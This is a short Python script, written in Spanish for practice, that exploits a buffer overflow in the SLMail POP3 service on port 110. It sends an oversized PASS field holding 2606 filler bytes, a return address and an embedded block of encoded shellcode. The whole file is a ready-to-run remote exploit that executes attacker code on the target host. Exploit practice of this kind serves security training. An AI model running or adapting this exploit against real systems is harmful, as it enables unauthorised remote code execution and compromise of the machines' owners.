#!/usr/bin/python
# Bof a Slmail para practicas en python3
# Autor Liandd
from pwn import *
from struct import pack
import socket, sys

def exploit(ip_address, rport):
    
    shellcode = (
        b"\xdb\xc2\xbd\xb5\xd7\x1d\xde\xd9\x74\x24\xf4\x5e\x29\xc9"
        b"\xb1\x59\x83\xc6\x04\x31\x6e\x15\x03\x6e\x15\x57\x22\xe1"
        b"\x36\x18\xcd\x1a\xc7\x46\x47\xff\xf6\x54\x33\x8b\xab\x68"
        b"\x37\xd9\x47\x03\x15\xca\xdc\x61\xb2\xfd\x55\xcf\xe4\x30"
        b"\x65\xfe\x28\x9e\xa5\x61\xd5\xdd\xf9\x41\xe4\x2d\x0c\x80"
        b"\x21\xf8\x7a\x6d\xff\xac\x0f\x23\x10\xd8\x52\xff\x11\x0e"
        b"\xd9\xbf\x69\x2b\x1e\x4b\xc6\x32\x4f\xe3\x5d\x6c\x4f\x88"
        b"\x2a\x95\x8e\x5d\x2f\x6c\xe4\x5d\x79\xe4\x31\x16\x78\x2c"
        b"\x08\xd7\x4a\x10\xc7\xe6\x62\x9d\x19\x2f\x44\x7e\x6c\x5b"
        b"\xb6\x03\x77\x98\xc4\xdf\xf2\x3e\x6e\xab\xa5\x9a\x8e\x78"
        b"\x33\x69\x9c\x35\x37\x35\x81\xc8\x94\x4e\xbd\x41\x1b\x80"
        b"\x37\x11\x38\x04\x13\xc1\x21\x1d\xf9\xa4\x5e\x7d\xa5\x19"
        b"\xfb\xf6\x44\x4f\x7b\xf7\x96\x70\x21\x6f\x5a\xbd\xda\x6f"
        b"\xf4\xb6\xa9\x5d\x5b\x6d\x26\xed\x14\xab\xb1\x64\x32\x4c"
        b"\x6d\xce\x53\xb2\x8e\x2e\x7d\x71\xda\x7e\x15\x50\x63\x15"
        b"\xe5\x5d\xb6\x83\xef\xc9\xf9\xfb\xf0\x04\x92\xf9\xf0\x17"
        b"\xd9\x74\x16\x47\x4d\xd6\x87\x28\x3d\x96\x77\xc1\x57\x19"
        b"\xa7\xf1\x57\xf0\xc0\x98\xb7\xac\xb9\x34\x21\xf5\x32\xa4"
        b"\xae\x20\x3f\xe6\x25\xc0\xbf\xa9\xcd\xa1\xd3\xde\xa9\x49"
        b"\x2c\x1f\x5c\x49\x46\x1b\xf6\x1e\xfe\x21\x2f\x68\xa1\xda"
        b"\x1a\xeb\xa6\x25\xdb\xdd\xdd\x10\x49\x61\x8a\x5c\x9d\x61"
        b"\x4a\x0b\xf7\x61\x22\xeb\xa3\x32\x57\xf4\x79\x27\xc4\x61"
        b"\x82\x11\xb8\x22\xea\x9f\xe7\x05\xb5\x60\xc2\x15\xb2\x9e"
        b"\x90\x31\x1b\xf6\x6a\x02\x9b\x06\x01\x82\xcb\x6e\xde\xad"
        b"\xe4\x5e\x1f\x64\xad\xf6\xaa\xe9\x1f\x67\xaa\x23\xc1\x39"
        b"\xab\xc0\xda\xca\xd6\xa9\xdd\x2b\x27\xa0\xb9\x2c\x27\xcc"
        b"\xbf\x11\xf1\xf5\xb5\x54\xc1\x41\xc5\xe3\x64\xe3\x4c\x0b"
        b"\x3a\xf3\x44"
    )

    buffer = b"A" * 2606 + pack("<L", 0x5f4a358f) + shellcode
    
    p1 = log.progress("Data")
    try:
        p1.status("Enviando %s bytes" % len(buffer))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip_address, rport))
        s.recv(1024)
        s.send(b'USER eva\r\n')
        s.recv(1024)
        s.send(b'PASS ' + buffer + b'\r\n')
        s.recv(1024)
    except Exception as e:
        print("\n[!] Ha habido un error de conexiÃ³n:", e)
        sys.exit(0)

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print ("\n[!] Uso : python " + sys.argv[0] + " <ip-address>\n")
        sys.exit(0)

    ip_address = sys.argv[1]
    rport = 110

    exploit(ip_address, rport)
                              